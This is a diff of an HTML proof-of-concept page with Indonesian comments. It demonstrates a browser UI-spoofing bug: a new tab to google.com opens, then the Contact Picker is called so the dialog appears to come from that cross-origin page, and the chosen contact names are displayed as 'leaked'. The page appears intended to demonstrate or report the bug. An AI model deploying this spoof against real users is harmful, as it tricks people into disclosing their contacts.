@@ -1,28 +1,33 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-        <title>PoC</title>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
-        <script>
-            onclick = async () => {
-                (async () => {
-                    let contacts = await navigator.contacts.select(["name"], {});
-                    document.write(`
-                        <h1>
-                            <font color="red">Leaked information:</font> ${contacts[0]["name"]}</font>
-                        </h1>
-                    `);
-                })();
-                open("https://www.google.com", "PoC", "_blank");
+<head>
+    <title>Contacts UI Spoof PoC</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <script>
+    onclick = async () => {
+        // Buka tab baru terlebih dahulu, membuat pengguna mengira Contacts berasal dari tab baru
+        const newWin = open("https://www.google.com", "PoC", "_blank");
+        
+        // Kemudian segera panggil Contacts picker
+        // Pada versi yang rentan, dialog Contacts tidak akan ditutup meskipun tab asli kehilangan fokus
+        try {
+            const contacts = await navigator.contacts.select(["name", "tel"], { multiple: true });
+            if (contacts.length > 0) {
+                document.body.innerHTML = `
+                    <h1 style="color:red">Leaked: ${contacts.map(c => c.name).join(", ")}</h1>
+                `;
             }
-        </script>
-    </head>  
-    <body>
-        <br><br><br>
-        <center>
-            <h1>Click anywhere on the page to show the Contact dialog over a cross-origin page!</h1>
-        </center>
-    </body>
-  </body>
+        } catch(e) {
+            console.log("Picker gagal:", e.message);
+        }
+    }
+    </script>
+</head>
+<body>
+    <br><br><br>
+    <center>
+        <h1>Klik di mana saja: Dialog Contacts akan melayang di atas halaman google.com</h1>
+    </center>
+</body>
 </html>
